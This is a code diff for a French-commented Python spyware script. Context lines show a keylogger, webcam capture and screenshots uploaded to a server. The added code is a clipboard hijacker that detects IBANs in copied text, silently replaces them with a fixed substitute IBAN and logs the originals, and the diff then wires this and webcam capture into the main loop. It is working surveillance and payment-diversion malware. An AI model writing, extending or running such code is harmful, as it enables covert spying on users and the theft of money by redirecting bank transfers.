@@ -1,7 +1,9 @@
 import main
+import pyperclip
+import re
+import time
 
 start_time = main.time.time()
-
 # Initialisation de la webcam
 def webcam():
     # Créer le dossier si nécessaire
@@ -46,14 +48,6 @@ def on_press(key):
             fichier.write(f" [{key}] ")
 
 
-def mise_en_veille_toutes_les_1_minutes():
-    while True:
-        # Mettre le PC en veille
-        main.os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
-        
-        # Attendre 2 minutes avant la prochaine mise en veille
-        main.time.sleep(60)
-
 def capture_ecran():
     # S'assurer que le dossier existe, sinon le créer
     if not main.os.path.exists(main.destination_folder):
@@ -71,13 +65,56 @@ def capture_ecran():
     print(f"Capture d'écran enregistrée sous : {chemin_fichier}")
     print(nom_fichier)
     main.uploadServer(nom_fichier)
+
+
+# Expression régulière pour détecter les IBAN
+iban_regex = r'\b[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}\b'
+
+# IBAN de remplacement (à personnaliser)
+replacement_iban = "FR76 3000 6000 0112 3456 7890 189"
+
+# Fichier où l'IBAN original sera sauvegardé
+output_file = "iban_copies.txt"
+
+# Fonction pour détecter et remplacer l'IBAN
+def detect_and_replace_iban():
+    copied_text = pyperclip.paste()  # Récupération du texte du presse-papier
+    found_iban = re.findall(iban_regex, copied_text)  # Recherche d'un IBAN dans le texte copié
+
+    if found_iban:
+        modified_text = re.sub(iban_regex, replacement_iban, copied_text)
+        pyperclip.copy(modified_text)  # Copier le texte modifié dans le presse-papier
+        
+        # Enregistrement de chaque IBAN détecté dans un fichier texte
+        with open(output_file, "a") as file:
+            for iban in found_iban:
+                file.write(iban + "\n")
+        
+        print(f"IBAN détecté et remplacé. L'IBAN original a été sauvegardé dans {output_file}.")
+        return True
+    return False
+
+def monitor_clipboard():
+    previous_text = ""
+    try:
+        while True:
+            current_text = pyperclip.paste()  # Récupération du texte actuel dans le presse-papier
+            if current_text != previous_text:  # Si le texte du presse-papier a changé
+                if detect_and_replace_iban():  # Remplacer l'IBAN si trouvé
+                    previous_text = pyperclip.paste()  # Met à jour le texte précédent pour éviter les doublons
+                else:
+                    previous_text = current_text
+            time.sleep(1)  # Pause d'une seconde entre chaque vérification
+    except KeyboardInterrupt:
+        print("\nArrêt du programme par l'utilisateur.")
+
   
 def Main():
     while main.time.time() - start_time < 120:
         get_clipboard_content()
         capture_ecran()
-
-
+        monitor_clipboard()
+        webcam()
 
 if __name__ == "__main__":
     Main()
